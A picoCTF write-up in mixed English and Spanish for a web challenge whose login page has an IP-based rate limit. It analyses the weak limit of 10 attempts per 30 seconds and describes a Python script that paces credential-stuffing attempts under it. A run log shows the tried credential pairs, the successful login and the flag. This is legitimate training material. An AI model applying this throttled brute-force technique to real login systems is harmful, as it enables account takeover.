**Challenge**
	Web Exploitation

**Description**
	Your friend is building a simple website with a login page.To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible.To test their defense, they’ve:
		- Created a dummy account with a random username–password pair from public credential lists.
		- Given you those username and password lists.
		- Shared the full source code.
	Can you bypass the rate limit, log in, and capture the flag?
	Browse the site [here](http://candy-mountain.picoctf.net:63871/).
	App source code: [here](https://challenge-files.picoctf.net/c_candy_mountain/eeb12eb92d02e7e0eba7f1f8bee5b2d457d602ad5bfa84e5023acd35a126deeb/app.py). 
	Credentials dump [here](https://challenge-files.picoctf.net/c_candy_mountain/eeb12eb92d02e7e0eba7f1f8bee5b2d457d602ad5bfa84e5023acd35a126deeb/creds-dump.txt).
	**Hints**
		1. The python requests library might be useful

**Solution**
	1. **Análisis del código [[Archivos 07 Fool the Lockout/app.py]]
	    Al revisar la función `exceeded_rate_limit()` se observa que:
		    - El límite es de **10 intentos por IP**.
		    - Dentro de una ventana de **30 segundos (`EPOCH_DURATION`)**.
		    - Después se reinicia el contador.
		    - El bloqueo es **temporal**, no permanente:
			    `MAX_REQUESTS = 10`  
			    `EPOCH_DURATION = 30`
		    Además, el control se basa únicamente en:
			    `client_ip = request.remote_addr`
		    lo que indica que el rate limit **no es robusto**.
	2. **Identificación de la debilidad**
	    - No hay CAPTCHA.
	    - No hay bloqueo por usuario.
	    - No hay incremento progresivo del castigo.
	    - El contador se reinicia automáticamente.
	    Esto permite realizar un ataque de **fuerza bruta controlado en el tiempo**.
	3. **Explotación**  
	    Se desarrolló un script en Python usando `requests` que:
		    - Prueba combinaciones del archivo `creds-dump.txt`.
		    - Realiza **10 intentos**.
		    - Espera **30 segundos**.
		    - Repite el proceso hasta encontrar credenciales válidas.
	4. Código Python usado: [[Archivos 07 Fool the Lockout/solution.py]]
	5. Usando CLI con la [[Archivos 07 Fool the Lockout/solution.py]] hecha en Python:
		PS C:\Users\luise\Downloads\Archivos 07> py .\solution.py
		Trying rora:winner1
		Trying birendra:rumble
		Trying khalid:sting
		Trying stanislaw:ming
		Trying maged:nimrod
		Trying sigrid:telephon
		Trying alysse:sutton
		Trying emely:tyrant
		Trying cornel:rodman
		Trying shamira:marion
		⏳ Waiting 30 seconds...
		Trying cymbre:california
		Trying romola:steven
		Trying leisa:basketba
		Trying goldie:ferrari
		Trying celia:beatles
		Trying kathrine:tango
		Trying adrianne:iiiiii
		Trying rebbecca:core
		Trying meridel:bolton
		Trying riva:trent
		⏳ Waiting 30 seconds...
		Trying dorris:sponge
		Trying ngai:ellie
		Trying gwynn:grizzly
		Trying olenka:london1
		Trying vahe:devilman
		Trying germ:bigguns
		Trying bradwin:doogie
		Trying marinette:pic\'s
		Trying kori:swimming
		Trying leita:4you
		⏳ Waiting 30 seconds...
		Trying arzu:calimero
		Trying roanna:trooper1
		Trying meena:tracy
		Trying beryle:zippy
		Trying field:sunflowe
		Trying keaton:hall
		Trying amandine:whatup
		Trying cherise:dean
		Trying aidan:gallaries
		Trying medria:locutus
		⏳ Waiting 30 seconds...
		Trying marga:infinite
		Trying triston:kristina
		Trying ljilyana:carsten
		Trying paulo:chicks
		Trying woodrow:14141414
		Trying dacie:diamond1
		Trying evy:sex4me
		Trying amabelle:fatty
		Trying technical:market
		Trying celesta:drive
		⏳ Waiting 30 seconds...
		Trying sherill:icecube
		Trying nadir:vides
		Trying ayesha:necklace
		Trying dolorita:concorde
		Trying linnet:yaya
		Trying clareta:yankee1
		Trying colm:goblue
		Trying felton:divine
		Trying tera:mccabe
		Trying bethan:barber
		⏳ Waiting 30 seconds...
		Trying rohit:berry
		Trying cali:assword
		Trying faina:choke
		Trying saleem:ella
		Trying luelle:bolitas
		Trying emmey:spanner
		Trying carlyn:kokoko
		Trying sallyanne:mordor
		Trying my:hotsex
		Trying constantia:budlight
		⏳ Waiting 30 seconds...
		Trying tenille:lambert
		Trying suria:james007
		Trying princeton:olympic
		Trying goska:allan
		Trying joana:citroen
		Trying deane:shoe
		Trying brynna:church
		Trying oliver:higgins
		Trying erinn:nineinch
		[+] FOUND!
		erinn nineinch
		<!doctype html>
		<html>
		<head>
		  <title>Silly Little Page</title>
		  <link rel="stylesheet" href="/static/index.css">
		</head>
		
		<body>
		  <div class="container">
		
		    <!-- Header box -->
		    <div class="header-box">
		      <div class="title-box">
		        <h1 id="page-title">Homepage</h1>
		      </div>
		      <hr>  <!-- light grey line -->
		
		      <div class="welcome-logout">
		        <h3 class="welcome-message">Welcome <em>erinn</em></h3>
		        <a href="/logout" class="logout-button">Logout</a>
		      </div>
		
		
		      <p class="flag-message">picoCTF{f00l_7h4t_l1m1t3r_6f501f28}</p>
		
		    </div>
		
		  </div>
		</body>
		
		</html>
		PS C:\Users\luise\Downloads\Archivos 07>

**Notes**
	1. El rate limiting implementado es **débil**, ya que:
	    - Solo limita por IP.
	    - No previene ataques distribuidos ni automatizados.
	    - Permite continuar el ataque después de un tiempo corto.
	2. Este tipo de protección **no detiene ataques de fuerza bruta**, solo los ralentiza.
	3. Una implementación más segura debería incluir:
	    - CAPTCHA.
	    - Bloqueo por cuenta.

**References**
	